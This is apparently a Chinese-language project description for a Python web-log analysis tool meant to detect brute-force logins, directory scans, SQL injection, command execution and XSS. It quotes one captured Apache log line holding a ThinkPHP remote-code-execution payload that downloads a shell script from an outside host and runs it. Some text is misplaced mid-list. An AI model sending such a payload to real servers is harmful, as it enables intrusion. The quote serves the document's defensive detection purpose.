### 基于python的web日志分析工具
#### 简介
&emsp;&emsp;当前web服务面临的安全威胁越来越多，基本上任何一台连接互联网的服务器都被不同程度的扫描过，甚至有一些被攻击过。而对web日志进行分析无疑是发现威胁，以及攻击溯源的重要手段。开发该工具旨在减轻安全人员的压力，更加快速准确的发现安全威胁。
#### 功能实现
&emsp;&emsp;考虑到当前能力和资源均有限，该工具主要是发现一些现有的，比较常见的威胁，并且初期的版本将只针对常见的攻击和扫描进行识别，并对一些简单的攻击进行溯源。分析的日志目前也比较单一，主要是apache的标准web日志。预计在项目进行过程中将会根据实际情况进行必要的拓展。结合最近手动分析的一些web日志，我们发现了一些威胁出现的频率非常高，这里面出现最频繁的就是密码爆破和后台目录扫描，因此对这两种威胁的发现也将是该工具实现功能的重点。除此之外，也有少数但后果相当严重的威胁来源于对远程代码执行漏洞的攻击和一些获取webhell的攻击。其他攻击目前基本没有发现，大概是因为笔者的服务器价值不高，且无论服务器价值，高级的攻击都不常见。

    一段命令执行的请求：185.244.25.128 - - [31/Jan/2019:05:47:12 +0800] "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20 HTTP/1.1" 200 54340 "-" "Go-http-client/1.1"
    该请求出正常要求外还会下载一个脚本，修改权限并执行该恶意脚本。
综合各种情况，该工具将实现对以下威胁的识别：（不完全）
面设计，使用的技术基于pyqt。软件各项功能均基于python实现。具体技术细节日后将在后续的日志中逐一进行完善。
1. 目录爆破
2. 密码爆破
3. SQL注入
4. 命令执行
5. xss利用
6. 其他待定
#### 使用的技术
&emsp;&emsp;为使软件的使用更加便捷，该工具基于图形界面。